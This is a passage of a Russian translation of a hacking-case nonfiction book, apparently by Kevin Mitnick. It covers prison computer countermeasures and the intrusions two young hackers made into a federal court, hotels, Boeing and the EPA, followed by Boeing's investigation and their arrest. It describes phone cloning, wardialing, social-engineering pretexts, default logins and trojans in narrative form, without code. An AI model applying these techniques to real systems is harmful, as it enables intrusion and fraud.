поводу моих способностей. Они поместили в мое личное дело специальное предупреждение всем сотрудникам тюрьмы: не сообщать мне никакой информации, даже не называть собственных имен, поскольку они верили в совершеннейшую дикость. — что я могу проникнуть в любые государственные секретные базы и устранить оттуда сведения о любом человеке, даже о Маршале США. Боюсь, что они просто слишком много раз смотрели кинофильм «Сеть».   КОНТРМЕРЫ   Все события, описанные в этой главе, произошли в закрытом и полностью контролируемом месте: даже в военных организациях жизнь сотрудников не контролируется так тщательно, как жизнь заключенных в тюрьме. Во всяком случае, так думают практически все, включая руководство тюрем.  Хотя большинство мер предосторожности, которые предотвращали бы описанные преступления, аналогичны тем, которые мы рекомендовали любой компании (и они многократно перечислялись в этой книге), некоторые уникальны или имеют особенную важность для случая тюрьмы. Вот они.  • Ясно помечать все компьютеры и другие электронные устройства, имеющие выход во внешнюю сеть или имеющие доступ к такой информации, куда заключенных допускать не следует, метками «ТОЛЬКО ДЛЯ ПЕРСОНАЛА». В разряд такой закрытой информации попадает вся личная информация об охранниках и сотрудниках тюрьмы, а также и обо всех заключенных, чертежи и схемы всех зданий (включая детали вентиляционной системы и все ходы сообщения, которые могут быть использованы для попыток побега).  • Все другие компьютеры помечать «ДЛЯ ЗАКЛЮЧЕННЫХ».  • Тщательно проводить инвентаризацию всех компьютеров, компьютерной периферии и деталей компьютеров. Разработать систему отслеживания их перемещений, проще всего это сделать, написав на каждом из них уникальный номер. Убедиться в том, что заключенные не могут самостоятельно приобретать компьютеры, их детали или другое оборудование (особенно модемы), за исключением специальных разрешений и при надлежащем контроле.  • Допускать заключенных до выполнения вспомогательных работ в администрации тюрьмы с использованием компьютеров только в случае квалифицированного контроля всех действий со стороны знающего детали работы сотрудника тюрьмы.  • Вменить в обязанности технического персонала тюрьмы проведение регулярных проверок компьютеров, на которых работают заключенные, чтобы убедиться, что в них ничего не изменено. В первую очередь проверяющие должны следить за тем. что бы у компьютеров не было выхода в Интернет через проводное или беспроводное соединение и не было установлено никакое дополнительное программное обеспечение. Сотрудники тюрьмы, проводящие такие проверки, должны быть хорошо знакомы с методами выявления подобного ПО, которое может быть спрятано или работать в скрытом режиме. Необходимо также регулярно проводить поиск работающих беспроводных устройств (недавно появившаяся и растущая угроза в современных сетях WiFi).  • Использовать ПО, которое позволяет запускать на компьютерах только определенный набор задач и приложений. Федеральное агентство по тюрьмам обычно использовало и, возможно, продолжает использовать для этой цели специальную программу под названием Watchdog.  • Содержать все компьютеры, особо помеченные «ТОЛЬКО ДЛЯ ПЕРСОНАЛА» в специальных охраняемых комнатах.  • Разработать политику управления паролями и требовать обязательного использования пароля для «скринсейвера» и других программ для электронного блокирования компьютеров от несанкционированного использования.  • Разработать специальную методику для регулярного обновления операционных систем и приложений, использования всех последних «заплаток» для систем безопасности. Необходимо использовать не только антивирусное ПО, но также и специальные программы для выявления любых форм шпионского ПО, а также программ, которые скрытно могут реализовывать удаленный доступ.   ПОСЛЕСЛОВИЕ   На первый взгляд здравый смысл подсказывает, что сложные меры безопасности — не более, чем бесполезная трата времени и сил. В военной школе, к примеру, вы вряд ли обнаружите большое число студентов, стремящихся постоянно нарушать правила или обманывать. И в обычной школе вряд ли отыщется десятилетний ученик, разбирающийся в системах компьютерной безопасности лучше специалистов.  И в тюрьме едва ли можно было ожидать, что заключенные, за которыми пристально наблюдают, которые живут по строгому расписанию, не только найдут способ выходить в Интернет, но и станут проводить там долгие часы, ежедневно наслаждаясь музыкой, кинофильмами, общением с женщинами и углублением своих компьютерных знаний.  Мораль: если вы отвечаете за компьютерную безопасность любой школы, рабочей группы, компании, в общем, любого сообщества, — будьте всегда уверены, что его безопасность недостаточна. Постоянно думайте о том, что вы упустили. На ум приходят слова «постоянная бдительность».       Глава 4.    Полицейские   и   воры      Я подумал: «О, Господи!», бросился в комнату, где сидели полицейские офицеры, и сказал: «Ребята, вам знакомы эти имена?» Я прочел список имен. Один из полицейских сказал: «Это судьи США в районе Сиэтла». Я сказал: «Так вот у меня есть список из двадцати шести взломанных паролей». Полицейские просто позеленели от ярости.      Дон Боэлинг, компания BoeingAircraft   Мэтт и Коста не планировали атаковать Boeing Aircraft.  Но так уж получилось. Но последствия этого случая в сочетании с другими хакерскими попытками стали серьезным предупреждением для всего бизнеса. Эти двое могли бы стать героями постеров в кампании, предостерегающих молодых хакеров от подобных действий.  Коста Катсаниотис начал знакомиться с компьютерами в одиннадцать лет, когда ему подарили Commodore Vic 20, и он начал писать программы для того, чтобы улучшить его работу. Уже в том младенческом возрасте он написал программу, которая позволяла его друзьям соединяться с его компьютером по телефону и видеть список того, что находится на его жестком диске. «Именно тогда я начал работать с компьютерами и полюбил все конкретные мелочи этой работы». Он имеет в виду не только программирование: он не менее активно работал и с оборудованием, не боясь, как он выражается, «потерять отвертку», потому что «начал развинчивать что-то еще года в три».  Мама отправила его в частную христианскую восьмилетнюю школу, а потом — в публичную школу. В этом возрасте он полюбил музыку группы U2 (он до сих пор остается ее поклонником), также как Def Leppard и «еще кое-что из темной музыки»; его вкусы в области компьютеров постепенно расширялись в сферу телефонии. Более старшие ребята научили его использовать «800-WATS-номep» для бесплатных междугородных звонков.  Коста любил компьютеры и понимал их на каком-то природном уровне. Возможно, отсутствие отца повысило его интерес к той области, где он мог наслаждаться полным контролем.  «В старших классах я иногда отвлекался от компьютера, потому что у меня проснулся интерес к девушкам. Но моя страсть к компьютерам не ослабевала никогда, и они всегда были где-то рядом. Я не начинал заниматься хакерством до тех пор, пока у меня не оказался в руках компьютер, который мог с этим справиться. Это был Commodore 128».  Коста встретил Мэтта — Чарльза Мэтью Андерсона — в Интернете на специальном сайте BBS в Вашингтоне. «Около года мы встречались там, и общались по телефону и через электронную почту, пока не встретились лично». Мэтт, чей псевдоним в Сети был Cerebrum, называет свое детство «абсолютно нормальным». Его отец был инженером в компании Boeing и дома у них был компьютер, которым Мэтту разрешалось пользоваться. Можно представить себе, какими странными казались отцу предпочтения Мэтта в музыке: он предпочитал стиль «индастриал» и кое-что из «темных направлений».  «Я начал программировать в возрасте девяти лет. Почти все мое детство я занимался графикой и музыкой на компьютере. В этом заключена одна из причин того, что я люблю компьютеры и по сей день — подобное занятие и сегодня доставляет мне удовольствие.  С хакерством я впервые соприкоснулся в старших классах школы, когда понял, что можно использовать телефонную сеть, которой пользовались только учителя и администраторы школы для междугородных звонков. Я часто пользовался этим обманом в старших классах».  Мэтт окончил школу, войдя в десятку лучших выпускников и поступил в университет Вашингтона, где начал постигать высокую компьютерную премудрость. — он занимался вычислениями на мейнфреймах. В колледже, работая с UNIX-машинами, он начал изучать этот аспект компьютерных вычислений «с помощью Интернет-сайтов и новостных лент в Интернете».   ТЕЛЕФОННОЕ   ЖУЛЬНИЧЕСТВО   Зародившаяся между Мэттом и Костой дружба плохо на них повлияла — они двинулись по дорожке телефонного хакерства, которое известно еще под названием «фрикинг». Коста вспоминает, как однажды ночью они занимались тем, что хакеры называют «разрыванием помоек», что по сути своей означает поиск в отбросах, остающихся в телефонных вышках. «В них можно отыскать списки телефонов, относящихся к этой башне», то есть телефонные номера и электронные номера (ESN Electronic Serial Number), которые являются уникальными идентификаторами каждого мобильного телефона, Мэтт вспоминает: «Это были тестовые номера, которые техники используют для проверки уровня сигнала. Для каждой базовой станции существовали такие специальные номера».  Ребята приобрели телефоны OKI 900 и устройства для перепрограммирования чипов в телефонах. Они не только перепрограммировали новые номера, но также устанавливали и новое ПО, которое позволяло программировать любые номера и ESN-номера в каждом телефоне. Перепрограммируя телефоны на специальные тестовые номера, они обнаружили, что так можно получить доступ к бесплатным телефонным звонкам. «Пользователи набирают номер, по которому хотят позвонить. Если мы хотим, то быстро можем переключить звонок на другой номер», — говорит Коста.  (Происходит то, что я называю «планом Кевина Митника для сотового телефона» — плата составляет ноль за месяц, ноль за минуту — вы можете вообще перестать платить за телефонные разговоры, вы понимаете, что я имею в виду).  С помощью такого перепрограммирования Мэтт и Коста могли звонить куда угодно из любого места на планете: если информация об их звонках и записывалась куда-то, то только в архивы сотовых операторов. Никакой платы, никаких вопросов. Просто бесплатные переговоры, которые очень любят фрикеры и хакеры.   ПУТЬ   В   СУД   Попасть под суд — это последнее, о чем думают хакеры. Коста и Мэтт попались на заре своей хакерской карьеры, но по разным причинам.  Помимо поисков в телефонных отбросах и подмены телефонов два наших героя часто занимались поиском модемов dial-up, через которые они могли бы проникнуть в интересующие их системы. За одну ночь они могли проверить около 1200 телефонных номеров таких модемов. За два-три дня они могли проверить целую телефонную книгу. После завершения этого процесса они получали список перспективных номеров, от которых получали ответ. «Я запускал мою поисковую программу на телефонах в Сиэтле, которые начинались с 206-553», — вспоминает Мэтт. «Все эти телефоны принадлежали государственным агентствам того или иного типа. Именно поэтому нам были интересны эти номера — мы могли проникнуть в государственные компьютеры». Никакого конкретного плана у них не было.  Коста: «Мы были детьми и не имели никакого конкретного плана». «Фраза: „Что мы будем сканировать сегодня ночью?“ звучит гораздо интереснее, чем фраза: „Что мы делаем сегодня ночью?“ Мэтт: „Все, что вы делаете, это забрасываете сеть в море и смотрите, какую рыбу она вам приносит“.  Коста просмотрел запись работы программы ночного поиска и обнаружил, что однажды она обращалась к компьютеру, который вернул ответную информацию типа «Районный суд США». Он тогда сказал: «Федеральная собственность — это звучит заманчиво».  Но как проникнуть в эту систему? Надо как минимум знать имя пользователя и пароль. « О б этом уже подумал Мэтт», — говорит Коста. И ответ был совсем простой: имя пользователя — «public», пароль — «public». Оказывается, на этом суровом сайте государственного учреждения никто серьезно не думал о безопасности.  «Как только мы проникли в их систему, мы сразу добрались до файла паролей». — рассказывает Мэтт. Они переписали все имена и пароли судей. «Судьи пользовались сайтом для того, чтобы получать информацию о судебной системе и просматривать прецеденты судебных разбирательств».  Чувствуя, что они делают что-то неправомерное, Мэтт говорит: «Мы никогда не забирались слишком далеко в судебные „недра“. Во всяком случае, в тот момент».   ГОСТИ   ОТЕЛЯ   Ребята занимались и другими аферами. « М ы проникли как-то в кредитную организацию. Мэтт обнаружил там набор номеров, с помощью которого можно было делать телефонные звонки за счет этой организации». У них еще был план проникнуть в компьютерную систему Департамента автомобилей и понять, какие водительские права или что-то подобное там можно себе устроить.  Они продолжали оттачивать свое мастерство и проникать в разные компьютеры.  «Мы побывали в куче компьютеров в нашем городе, например — на сайтах автомобильных дилеров. Да, кстати, там был один отель в районе Сиэтла. Я позвонил им и представился компьютерным техником из компании, которая поставила им программу для резервирования номеров. Я объяснил одной из девушек, сидящих на регистрации, что возникли некоторые технические проблемы и они не смогут нормально работать до тех пор, пока не внесут в программу некоторые изменения».  Разыгрывая этот достаточно стандартный «гамбит» из области социальной инженерии, Мэтт без малейших затруднений получил в свое распоряжение необходимую информацию для входа в систему, «Имя пользователя и пароль были „hotel“ и „learn“, соответственно». Это были значения, которые установили в самом начале разработчики программы, и они никогда не изменялись.  После проникновения в компьютеры первого отеля он смог познакомиться с программой резервирования номеров и понять, что она широко используется. Когда ребята проникли в другой отель через несколько месяцев, то обнаружили там уже хорошо знакомое им ПО. Они предположили, что и этот отель использует изначальные значения для имени пользователя и пароля и … оказались правы. Коста вспоминает:  «Мы вошли в компьютер отеля. Передо мной появился в точности такой же экран, какой видят сотрудники отеля. Я вошел в систему и заказал с е б е номер с т о и м о с т ь ю т р и с т а долларов за уикэнд с шикарным видом из окон, оплаченным баром и всеми прочими удовольствиями. Я использовал ложное имя и оставил пометку, что за комнату уже заплачено пятьсот долларов. Номер был зарезервирован на ночь, но мы оставались там все выходные, веселясь и исправно опустошая минибар».  Доступ в компьютер отеля давал им доступ к информации обо всех гостях, остановившихся в отеле, «включая и всю финансовую информацию».  Перед выездом из отеля, наши герои у стойки регистрации потребовали «сдачу», поскольку переплатили за номер. Служащий сказал, что им будет выслан чек. Они дали ему вымышленный адрес и ретировались.  «Никто никаких претензий нам не выдвигал», — говорит Коста, добавляя: «Вероятно, мы не превысили уровень расходов, ну, может быть, совсем чуть-чуть — в баре».   ОТКРЫВАЯ   Д  В  Е  Р  Ь   После тех бурных выходных вдохновленные парни вернулись к своим компьютерам, чтобы посмотреть, какую еще пользу они могут извлечь из своего проникновения в систему районного суда. Они быстро поняли, что операционная система для компьютера суда была куплена в компании, которую мы в дальнейшем будем называть «Subsequent», Программа имела такую особенность, что инициировала телефонный звонок в «Subsequent», когда требовалось внести изменения в программу — например, «если клиент „Subsequent“ приобретал межсетевой экран и для его установки надо было внести какие-то изменения в системы, имелся специальный путь для их внесения, Таким путем мы опять там оказались», — объясняет Коста.  У Мэтта был товарищ, умеющий программировать на языке С, который мог писать трояны — так называются программы, которые открывают хакерам секретный путь в компьютер, где они уже однажды побывали. Это особенно удобно, если поменялись пароли или были предприняты другие шаги для блокировки доступа. Через компьютер Районного суда Мэтт послал троян в корпоративный компьютер «Subsequent». Хакерская программа была написана так, что «находила все пароли и переписывала их в секретный файл, а кроме того, обеспечивала доступ на уровне администратора в том случае, если бы наш доступ был заблокирован».  Проникновение в компьютер «Subsequent» привело к неожиданным результатам: они получили список всех компаний, использующих систему Subsequent. Настоящее сокровище.. «Это был список компьютеров, в которые мы могли проникнуть». В этом списке была и такая крупная компания (где работал отец Мэтта) как Boeing Aircraft.  «Мы получили имя и пароль одного из инженеров Subsequent. который работал над устройствами для Boeing. Таким образом мы получили доступ ко всем устройствам в Boeing», — рассказывает Коста. С первого же раза, как Мэтт набрал номер внешнего телефонного соединения с системой Boeing, ему повезло.  «Последний из тех, кто пользовался там модемом, не отключил его, поэтому после звонка туда я смог продолжить его работу под его именем. Неожиданно я оказался в его хозяйстве».  Некоторые старые модемы были устроены так, что они не отключали пользователя автоматически после того, как он прекращал работу. Когда я был моложе, если мне надо было попасть в систему с таким модемом, я сам прерывал соединение у работающего пользователя, посылая команду на коммутатор телефонной компании или действовал методами социальной инженерии, прося техника прервать соединение. После разрыва соединения, я звонил сам и получал доступ в систему того пользователя, соединение которого я прервал. Мэтту и Косте удалось проникнуть в разорванное соединение безо всяких предварительных усилий.  Они попали на какой-то Unix-уровень (shell) пользователя и это означало, что они проникли за защитный экран, причем компьютер ожидал от них указаний, что делать. Мэтт вспоминает: «Я немедленно перешел к действиям и взломал его пароль, а потом использовал его на другой машине, где мог получить доступ с правами системного администратора  (  root  access  —  «корневой»  доступ —  прим  .  переводчика  ). После получения доступа с таким приоритетом мы могли использовать имена других пользователей, входить в другие компьютеры и изучать их действия».  Конечно, неотключенный модем в момент звонка Мэтта был случайностью, но то, что происходило в Boeing позднее, когда Мэтт и Коста начали проникать в компьютеры компании, выглядело еще более странным.   ЗАЩИТА   БАРРИКАД   Как раз в тот момент в Boeing Aircraft проходил серьезный семинар, посвященный компьютерной безопасности, для представителей самой компании, а также полицейских, сотрудников ФБР и других секретных служб.  Руководил семинаром Дон Боэлинг, человек, хорошо знакомый с мерами компьютерной безопасности Boeing и предпринимающий шаги для их улучшения, в течение долгих лет Дон вел нелегкую битву за внутреннюю безопасность. «Наша сеть и уровень компьютерной безопасности были такими же, как и везде, то есть недостаточными. И я был этим серьезно озабочен».  Еще в 1988 году, когда он работал в недавно образованном подразделении Boeing Electronics. Дон участвовал в совещании с президентом и несколькими вице-президентами этого подразделения и сказал им: «Посмотрите, что я могу сделать с нашей сетью». Он проник в модемную линию и показал, что на ней нет паролей, далее он продемонстрировал, что может атаковать любую машину по своему желанию. Руководство компании увидело, что в одном компьютере за другим пароль пользователя-гостя был один и тем же — «guest». Он показал, как, используя аккаунты пользователей с такими паролями, можно просто получить доступ к файлу с паролями и перегрузить его на любой компьютер, даже вне компании.  Дон добился своей цели с помощью этой демонстрации. «После нее в компании Boeing началась программа по усилению компьютерной безопасности», — рассказывает Дон, Но все эти усилия оставались в зачаточном состоянии, когда Мэтт и Коста реализовали свое проникновение. Дону приходилось «тратить колоссальные усилия на убеждение руководства, чтобы на обеспечение безопасности выделялись серьезные средства». То. что проделали Мэтт и Коста, служило прекрасным аргументом в пользу доводов Дона.  Позиция лидера по обеспечению компьютерной безопасности позволила Дону организовать уникальный компьютерный класс в Boeing. «Представители правительства обратились с просьбой помочь организовать группу из представителей полиции и промышленности для совместной работы. Целью группы должно было стать повышение квалификации полицейских в сфере использования компьютерных технологий в их работе, включая исследовательские методики на базе последних достижений высоких технологий. Я был одним из главных организаторов этого процесса. В работе принимали участие представители компании Microsoft, UN West, телефонной компании, нескольких банков, нескольких финансовых организаций. Агенты секретных служб приходили и делились своими знаниями о технологических аспектах борьбы с хакерами».  Спонсором семинаров по инициативе Дона выступала компания Boeing, а проходили они в одном из центров подготовки компании. «Мы собирали до тридцати пяти полицейских на каждый недельный семинар, где рассказывали им, как сконфигурировать компьютер, как написать ордер на обыск, как готовить на компьютере все необходимые бумаги для судебного расследования — в общем, массу полезных сведений. У нас выступал и Ховард Шмидт, который потом был приглашен в службу „Безопасность Родины“, которая по заданию президента обеспечивала все работы в области борьбы с кибер-преступлениями».  На второй день занятий пейджер Дона зазвонил. «Я позвонил нашему администратору, Филлис, и она сказала «Происходят какие-то странные вещи с этой машиной, я не могу понять их причину'. В целом ряду спрятанных директорий находились файлы паролей, объяснила Филлис. А в фоновом режиме работает программа под названием Crack.  Это была плохая новость. Crack — это была программа, специально созданная для взлома шифра паролей. Она пробует в качестве паролей различные слова из словаря и их сочетания с номерами типа Bill1, Bill2, Bill3, чтобы отыскать значения паролей.  Дон послал своего коллегу Кена («нашего гуру по безопасности UNIX») посмотреть, что случилось. Через час Кен послал текст Дону на пейджер. «Лучше тебе прийти сюда. Дела обстоят плохо. Взломано уже много паролей, и они не принадлежат Boeing. На один из таких паролей тебе особенно стоит взглянуть».  Тем временем Мэтт трудился в поте лица в сети компьютеров Boeing. После того, как он получил доступ с привилегиями администратора, «было просто получить доступ к компьютерам других пользователей». Очень часто в файлах содержались номера телефонов производителей ПО и других компьютеров, с которыми компьютер мог соединяться. « Т а м был даже список всех узлов», — говорит Мэтт.  Вскоре двое наших хакеров получили доступ к базам данных самых разных компаний. « М ы запустили свои пальцы во множество мест». — говорит Коста.  Дон не хотел прерывать семинар и он попросил Кена переслать ему факс с текстом, появившимся на экране компьютера администратора. Когда этот факс пришел, Дон сначала облегченно вздохнул, поскольку в тексте не было ни одного знакомого ему имени. Однако, его озаботило то, что многие имена пользователей начинались со слова «Judge» (судья). Затем его буквально пронзила мысль.  «Я подумал: „О, Господи!“, бросился в комнату, где сидели полицейские офицеры, и сказал: „Ребята, вам знакомы эти имена?' Я прочел список имен. Один из полицейских сказал „Это судьи США в районе Сиэтла“. Я сказал „Так вот у меня есть список из двадцати шести взломанных паролей“. Полицейские просто позеленели от ярости“.  Дон заметил, что агент ФБР, с которым он работал в недалеком прошлом, быстро сделал несколько звонков по телефону.  «Он позвонил а районный суд и попросил к телефону системного администратора. Я мог слышать ответы парня на другом конце телефонной линии, „Нет, этого не может быть. Мы не соединены с интернетом. Они никак не могли получить файл с нашими паролями. Я не верю, что это наш компьютер“. А Р и ч отвечал ему: „Нет, э т о в а ш а машина. Мы видим файл паролей своими глазами“. Администратор продолжал г н у т ь свое: „ Н е т , этого н е могло случиться. Никто не может проникнуть в наши компьютеры“.  Дои глянул в список паролей и увидел, что взломан основной пароль самого высокого уровня — корневой директории — который известен только системным администраторам. Он показал это Ричу.  «Рич продолжил беседу по телефону: „Скажите, ваш корневой пароль „2ovens“?“ Мертвая тишина на другом конце линии была ему ответом.  Все услышали только звук, — похоже, голова того парня стукнулась об стол».  Когда все уселись на свои места. Дон почувствовал, что напряжен и е нарастает. «Я сказал им: „ Н у что же, ребята, пришло время провести тренировку в реальных условиях“?  Вместе с теми, кто следил за его действиями, Дон приготовился к битве. Прежде всего он отправился в компьютерный центр в Бельвью, где был расположен межсетевой экран. «Мы быстро обнаружили тот компьютер, на котором была запущена программа Crack, где работали хакеры и с IP-адреса которого они пришли».  К этому моменту с помощью программы взлома паролей, работающей на компьютере в компании Boeing, наши хакеры могли направиться в любую часть сети Boeing из сотен компьютеров.  Один из компьютеров, входящих в сеть Boeing, был не в Сиэтле, он находился на другом побережье США. Вот что вспоминает Коста : « Э т о был один из компьютеров Н А С А в исследовательской лаборатории в Вирджинии — Сгау5, настоящая драгоценность. Это был один из критических моментов. В моей голове стали роиться разнообразные фантазии. Одни секреты, хранящиеся в этом компьютере, могли сделать меня богатым, другие — лишить жизни, а третьи — упрятать в тюрьму».  Участники семинара тем временем знакомились с работой компьютерного центра Boeing. Они были просто ошеломлены, когда служба безопасности Boeing обнаружила, что атакующие полу-ч и л и доступ в компьютер Cray, с трудом поверил этому и Дон. « М ы должны были очень быстро, в течение часа, максимум двух, определить точку проникновения через межсетевой экран». Тем временем Кен расставлял в межсетевом экране виртуальные ловушки для того, чтобы определить, куда еще удалось проникнуть хакерам.  Дон позвонил в местную телефонную компанию и попросил их запустить режим «ловушек и отслеживания» на модемных линиях Boeing, которые использовали атакующие. Так называется методика отслеживания звонка, при которой определяется номер телефона, с которого этот звонок был сделан. Телефонисты согласились без возражений. «Они очень тесно сотрудничали с нами и прекрасно знали, кто я такой, поэтому не задавали вопросов. Это одно из преимуществ работы в специальном полицейском подразделении».  Дон расположил свой ноутбук между модемами и компьютерами, «в основном для того, чтобы фиксировать все командные строки в специальном файле». Затем он соединил с каждым компьютером принтеры Oki, чтобы «печатать все, что они делают в режиме реального времени. Мне это было необходимо для доказательств. Вы не можете возражать против листка бумаги, в отличие от электронного файла». Это не удивительно, — он должен был думать о том, чему больше поверят присяжные — электронному файлу или бумажному документу, напечатанному в момент происшествия.  Группа вернулась на семинар через несколько часов и Дон подробно описал сложившуюся ситуацию и принятые им меры. Полицейские офицеры внимательно вникали в ситуацию с противозаконными действиями с использованием компьютеров. «Нам предстояло проделать еще много работы для уяснения ситуации, и, пока я стоял беседуя с двумя полицейскими и моим коллегой, модем заработал опять. Бинго! Эти ребята опять подключились к компьютеру», — сказал Дон.  Телефонная компания отследила звонок Мэтта и Косты прямо до их домов. Команда безопасности заметила, когда они прошли через межсетевой экран. Потом они отправились в Университет Вашингтона, где вошли в компьютер Мэтта Андерсона.  Конечно же, Мэтт и Коста предпринимали некоторые предосторожности, которые, по их мнению, должны были защитить их звонки от выслеживания. В качестве одной такой меры они звонили в компанию Boeing не прямо, а соединялись с компьютерами районного суда, откуда уже отправлялись в Boeing. Они предполагали, что «если кто-то и будет их отслеживать из Boeing, то у него будет мало времени, чтобы определить, откуда пришел звонок», — говорит Коста.  Они и представить себе не могли, что каждое их движение фиксируется и записывается: как Мэтт звонил в суд, оттуда перевел звонок в Boeing, а затем — на свой студенческий аккаунт.  «Мы так просто попали в систему районного суда, все имена пользователей и паролей там были открыты, поэтому мы даже не задумывались об угрозе, грубо говоря, разленились. Именно мой прямой звонок позволил им вычислить мой адрес, после чего все рухнуло».  Команда Дона чувствовала себя подглядывающими в замочную скважину, когда Мэтт начал читать письма из своей электронной почты. «В письмах этого парня были подробно описаны различные хакерские приемы и ответы от других хакеров».  «Полицейские сидели и хихикали, потому что „два этих злобных юнца еще и не догадываются, что они пойманы“. Мы наблюдаем за ними в реальном времени и это дает нам неопровержимые доказательства».  Тем временем Дон оторвал листы бумаги из принтера, призвал всех присутствующих в свидетели и сказал: «Всего за шесть часов с момента вторжения мы обнаружили его и получили доказательства, достаточные для предъявления обвинения».  Не смеялось лишь руководство компании Boeing. «Они были напуганы тем, что увидели и хотели, чтобы действия хакеров были остановлены, — „Уберите их из наших компьютеров и прекратите все это сейчас же“. Дону удалось убедить их в том. что гораздо умнее будет немного подождать. „Я сказал: « М ы не знаем, во сколько мест удалось этим ребятам пробраться. Мы должны какое-то время последить за ними и узнать все их пути и что они там делают“. При таком огромном риске согласие руководства Boeing с предложением Дона свидетельствует о колоссальном авторитете его самого и его профессиональных навыков.   «ПОД   КОЛПАКОМ»   Один из полицейских чинов, посещавший семинар, получил ордер на прослушивание телефонов Мэтта и Косты. При этом запись всех их действий по телефону была лишь малой толикой полицейской активности. К этому моменту представители правительства воспринимали случившееся более чем серьезно. Развитие событий стало напоминать шпионский фильм или триллер: в университет были посланы группы агентов ФБР. Одетые как студенты, они следовали за Мэттом по всей территории и тщательно фиксировали все его действия, чтобы иметь потом возможность доказать, что он находился именно за конкретным компьютером. Иначе он мог бы без зазрения совести говорить, что «это был не я — множество людей использует этот компьютер ежедневно». Так уже бывало не раз.  Команда безопасности из Boeing предпринимала все меры предосторожности. которые только можно вообразить. Их задачей было не допускать хакеров к важной информации, и при этом следить за каждым их шагом, продолжая собирать доказательства их попыток и убеждаясь, что они не наносят вреда. Дон объясняет: «Мы стали контролировать вход во все наши компьютеры так, что системные администраторы записывали и извещали нас о том, что в них происходит». Писк пейджеров был своеобразным сигналом для участников «битвы». Члены команды безопасности мгновенно уведомляли определенных сотрудников компании Boeing, что хакеры продолжают свою деятельность. Несколько раз группа Дона электронным путем отслеживала активность Мэтта и Косты в Университете Вашингтона — где ключевые сотрудники были уведомлены о ситуации — все их перемещения по Интернету из одной точки в другую. Они как будто стояли за плечом у хакеров в момент любого их проникновения.  Дон принял решение наблюдать за ними еще четыре-пять дней, поскольку « м ы держали всю их деятельность под контролем, и они не делали ничего такого, что можно было бы отнести к опасным действиям, хотя у них были обширные возможности доступа, которые они могли использовать по своему усмотрению». Вскоре Коста понял, что что-то происходит.  «Однажды ночью мы с подружкой смотрели телевизор у меня дома. Ночь была теплая, окно было открыто, она выглянула наружу… и заметила машину на парковке неподалеку. Примерно через час она опять выглянула из окна и сказала: „ Э т а машина с парнями внутри стоит на прежнем месте, как и час назад“.  Коста выключил телевизор и свет в комнате, и начал записывать действия агентов Ф Б Р на видеокамеру. Через некоторое время он увидел, как вторая машина подъехала к первой. Люди в машинах о чем-то поговорили и обе машины уехали прочь».  На следующий день к Косте пришли полицейские. На вопрос об ордере на арест и обыск они ответили отрицательно, но Коста хотел показать, что он стремится к сотрудничеству с правоохранительными органами, поэтому он согласился ответить на несколько вопросов. Он не стал возражать и против того, что его попросили позвонить Мэтту и задать тому несколько вопросов о звонках по сотовым телефонам, причем их разговор при этом записывался на пленку.  Почему же он согласился позвонить своему лучшему другу и говорить с ним об их противозаконных действиях в присутствии стражей закона? Все очень просто: однажды вечером, шутливо обсуждая между собой возможные сценарии развития событий, они проигрывали вариант, когда окажется невозможным разговаривать свободно, поэтому они разработали специальный условный код. Если один из них использовал в разговоре сочетание «девять, десять» это означало «Опасность! Следи за тем, что ты говоришь!» (Они выбрали эту последовательность цифр, поскольку ее было просто запомнить — она была на единицу меньше чем номер вызова службы спасения — 911).  Поэтому, когда Косту попросили позвонить Мэтту и записывали их разговор, он начал его так: «Я звонил тебе несколько минут назад, в девять-десять, но не смог пробиться».   МЫШЕЛОВКА   ЗАХЛОПЫВАЕТСЯ   Группа безопасности компании Boeing обнаружила, что хакеры проникли не только в районный суд США, но и в Агентство по защите окружающей среды ( Е Р А — Environmental Protection Agency).  Дон Боэлинг сообщил Е Р А плохую новость. Как и системный администратор в районном суде, сотрудники Е Р А не сразу поверили в то, что в их систему можно проникнуть.  «Мы рассказали, что их компьютеры взломаны, но для них это звучало совершенно неприемлемо. Они отвечали: „Нет, нет, это невероятно“. У меня под рукой был файл с десятью или пятнадцатью взломанными паролями, я сказал им пароль сетевого администратора. Это привело их в состояние шока, поскольку оказалось, что все их ш е с т ь с о т с лишним компьютеров по в с е й территории США были соединены с Интернетом ч е р е з один и тот же аккаунт. Э т о был пользователь с правами системного администратора, а все остальные пользователи имели один и тот же пароль».  Сотрудники правоохранительных органов, посещавшие этот семинар по компьютерной безопасности, получили гораздо больше, чем могли ожидать. «Для тех, кто не участвовал вместе с нами в „полевых работах“, — рассказывает Дон, — мы в классах ежедневно подробно разбирали все сделанное. Они получали информацию из первых рук обо всем, что происходило».   ДОМАШНИЕ   ЗАГОТОВКИ   На Дона сильное впечатление произвело мастерство, с которым действовали хакеры, но еще больше он был удивлен, когда узнал, что всего два месяца назад они были осуждены за аналогичные действия и Коста был приговорен к тридцати дням принудительных работ.  Не прошло и месяца, как они опять нарушают закон, чувствуя себя неуязвимыми. Как такое может быть? Как объяснял потом Коста. они с Мэттом в этот момент уже беспокоились, потому что успели натворить гораздо больше, чем то, за что их судили в предыдущий раз. «Процесс похож на большой снежный ком, в котором они видят лишь небольшой снежок, с которого все начинается. Они не знают, как мы умеем использовать мобильную связь, они не знают, что у нас есть номера кредитных карточек, они даже представить себе не могут размах того, на чем они н а с поймали. Поскольку мы с Мэттом з а р а н е е обсуждали возможность того, что нас схватят, мы готовили слова, которые будем говорить полиции. Нам казалось, что мы прекрасно подготовились к вторжению в компьютеры и все это будет для нас как „раз плюнуть“. Это было очень глупо».   В   НОВОСТЯХ   Дон ехал на машине из Бельвью в Южную штаб-квартиру компании Boeing, где расположен его офис, и испытал настоящий шок. «Я включил программу новостей и услышал рассказ о том, как два хакера проникли в компьютерную систему компании Boeing и случай расследуется федеральными органами». «Черт побери», — подумал тогда Дон.  Позднее Дону удалось выяснить, что утечка информации произошла от сотрудника Boeing, который был очень недоволен тем, что за Мэттом и Костой стали наблюдать, а не арестовали их немедленно. Дон бросился в свой офис и позвонил всем участникам процесса: «Я сказал: „Все наши планы нарушены! Информация попала в новости! Мы должны сделать что-то сейчас“. Там был Говард Шмидт, специалист по написанию ордеров на обыск для компьютерных случаев, он помог все сделать правильно — так что не было никаких лишних вопросов».  На самом деле Дон не так уж был огорчен этой утечкой информации. «Мы были совсем близки к тому, чтобы схватить их с поличным. У нас были тонны доказательств против этих ребят». Но он подозревал, что за всем этим стояло нечто большее, до чего они еще не докопались. « М ы нашли несколько таких вещей, в которых они были замешаны, типа жульничества с кредитными карточками. Именно на этом они потом и были пойманы. Через полгода или год службы безопасности схватили их».   АРЕСТ   Коста знал, что рано или поздно, но этот день настанет, поэтому он не удивился однажды, услышав резкий стук в свою дверь. После этого ему пришлось познакомиться с 